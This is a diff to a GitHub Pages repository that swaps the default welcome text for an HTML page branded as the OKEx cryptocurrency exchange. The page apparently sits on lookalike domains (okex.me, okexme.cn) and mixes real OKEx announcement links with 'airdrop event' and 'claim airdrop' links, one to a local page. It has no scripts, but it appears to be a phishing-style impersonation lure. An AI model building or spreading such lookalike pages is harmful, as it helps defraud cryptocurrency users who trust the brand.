@@ -1,37 +1,112 @@
-## Welcome to GitHub Pages
+<!DOCTYPE html >
+<html>
 
-You can use the [editor on GitHub](https://github.com/OKEXME/OKOS/edit/master/index.md) to maintain and preview the content for your website in Markdown files.
+	<head>
+		<meta name="viewport" 
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+content="width=device-width,initial-scale=1.0, minimum-
+scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+		<meat charset="UTF-8">
+			
+		<title>OKEX</title>
+		<style type="text/css">
+		#logo{	
+			;
+			}
+		.one{
+		
+			
+			}
+		table{	
+			width:360px;
+			margin:auto
+			
+			
+			
+			}
+		td{	
+			text-align:left;														                   
+     border-bottom:2px solid fuchsia;
+			color:white;padding:15px;
+			font-size:25px;
+			}
+		a{
+			text-decoration:none;
+			color:white;
+			
+			}
+		a:hover{
+			color:red
+			
+			}
+		body { margin: 0; padding: 0;}	
+		
+		.size ul{
+			font-size:15px;
+			color:white;
+			
+			
+			}
+		.one{
+			font-size:20px;
+			color:darkgray;
+			margin:0px;
+			padding-bottom:30px;
+			padding-top:15px;
+			}	
+</style>
+	</head>
+	<body style="background-color:navy">
+		
+		<div id="logo"><img src="shree.png"width="120px" ></div>
+		<div class="one"><img src="one.jpeg"width="360px" ></div>
+		<br/>
+		<br/>
+		<br/>
+		<br/>
+		<br/>
+		<div style="text-align:center">
+			<table>
+				<tr>
+					<td><a href="https://www.okex.me"><span style="font-size:20px;padding:5px;">💒</span>官方网站</a></td>
+					<td><a href="http://m.okexme.cn/nd.jsp?id=18"><span style="font-size:20px;padding:5px;">🎁</span>空投活动</a></td>
+				</tr>
+				<tr>
+					<td><a href="https://www.okex.me/activity/jumpstart"><span style="font-size:20px;padding:5px;">🔰</span>Jumpstart</a></td>
+					<td><a href="厉害呗.HTML">📣</span>领取空投</a></td>
+				</tr>
+			</table>
+		</div>
+		</div>
+		<br/>
+		<br/>
+		<br/>
+		<br/>
+		<br/>
+		<div class="size">
+			<ul >
+				<li > <a href="https://okexsupport.zendesk.com/hc/zh-cn/articles/360033278871-关于FSN主网切换暂停充提的公告">关于FSN主网切换暂停充提的公告 <div 
 
-### Markdown
+class="one">2019/09/03</div></a></li>
+				<div style="border-top:1px silver dashed"></div>
+				<li><a href="https://okexsupport.zendesk.com/hc/zh-cn/articles/360033273271-OKB回购销毁情况公示-6月1日-8月31日-"> OKB回购销毁情况公示（6月1日-8月31日） <div 
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+class="one">2019/09/03</div></a></li>
+				<div style="border-top:1px silver dashed"></div>
+				<li><a href="https://okexsupport.zendesk.com/hc/zh-cn/articles/360032879092-关于EC钱包升级暂停充提的公告">关于EC钱包升级暂停充提的公告<div class="one">2019/09/02</div></a></li>
+				<div style="border-top:1px silver dashed"></div>
+						<li > <a href="https://support.okex.com/hc/zh-
+cn/articles/360033125931-%E5%85%B3%E4%BA%8EOKEx-Jumpstart%E5%85%AB%E6%9C%9F
+%E9%A1%B9%E7%9B%AE-X-power-Chain-XPO-%E9%94%80%E5%94%AE%E8%A7%84%E5%88%99">关于OKEx 
 
-```markdown
-Syntax highlighted code block
+Jumpstart八期项目 X-power Chain（XPO）销售规则 <div 
 
-# Header 1
-## Header 2
-### Header 3
+class="one">2019/08/30</div></a></li>
+				<div style="border-top:1px silver dashed"></div>
+				<li><a href="https://okexsupport.zendesk.com/hc/zh-cn/articles/360032998631-关于VNT主网切换开放充提的公告">关于VNT主网切换开放充提的公告<div 
 
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/OKEXME/OKOS/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+class="one">2019/08/28</div></a></li>
+			</ul>
+		</div>
+	</body>
+</html>
